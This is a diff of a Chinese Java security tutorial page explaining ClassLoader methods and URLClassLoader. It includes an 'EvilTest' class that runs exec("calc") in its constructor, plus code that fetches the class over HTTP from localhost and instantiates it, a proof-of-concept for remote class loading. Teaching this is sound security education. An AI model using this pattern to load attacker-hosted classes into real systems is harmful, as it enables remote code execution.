@@ -572,6 +572,29 @@ URLClassLoader loader = new URLClassLoader(urls, parentLoader);
 <p>能不能自己写个类叫java.lang.System？</p>
 <p>答案：通常不可以，但可以采取另类方法达到这个需求。 解释：为了不让我们写System类，类加载采用委托机制，这样可以保证爸爸们优先，爸爸们能找到的类，儿子就没有机会加载。而System类是Bootstrap加载器加载的，就算自己重写，也总是使用Java系统提供的System，自己写的System类根本没有机会得到加载。</p>
 <p>但是，我们可以自己定义一个类加载器来达到这个目的，为了避免双亲委托机制，这个类加载器也必须是特殊的。由于系统自带的三个类加载器都加载特定目录下的类，如果我们自己的类加载器放在一个特殊的目录，那么系统的加载器就无法加载，也就是最终还是由我们自己的加载器加载。</p>
+<h3 id="ClassLoader的核心方法"><a href="#ClassLoader的核心方法" class="headerlink" title="ClassLoader的核心方法"></a>ClassLoader的核心方法</h3><p>ClassLoader类有如下核心方法：</p>
+<p>loadClass(加载指定的Java类)<br>findClass(查找指定的Java类)<br>findLoadedClass(查找JVM已经加载过的类)<br>defineClass(定义一个Java类)<br>resolveClass(链接指定的Java类)</p>
+<h3 id="URLClassLoader"><a href="#URLClassLoader" class="headerlink" title="URLClassLoader"></a>URLClassLoader</h3><p>在 Java 安全中，<code>java.net.URLClassLoader.class</code> 这个类加载器是比较常用的，我们可以通过该类加载器来加载本地磁盘或者网络传输的 Class 文件。比如写一个EvilTest.java：</p>
+<pre><code class="java">root@iZbp14tgce8absspjkxi3iZ:~# cat EvilTest.java
+import java.io.IOException;
+
+public class EvilTest
+&#123;
+    public EvilTest() throws IOException &#123;
+        Runtime.getRuntime().exec(&quot;calc&quot;);
+    &#125;
+&#125;
+root@iZbp14tgce8absspjkxi3iZ:~# javac EvilTest.java
+root@iZbp14tgce8absspjkxi3iZ:~#
+</code></pre>
+<p>然后利用<code>URLClassLoader</code>进行加载：</p>
+<pre><code class="java">public static void test2() throws MalformedURLException, ClassNotFoundException, InstantiationException, IllegalAccessException &#123;
+    URL url = new URL(&quot;http://127.0.0.1/&quot;);
+    URLClassLoader classLoader = new URLClassLoader(new URL[]&#123;url&#125;);
+    Class clazz = classLoader.loadClass(&quot;EvilTest&quot;);
+    clazz.newInstance();
+&#125;
+</code></pre>
 
         </div>
         <!-- .entry-content -->
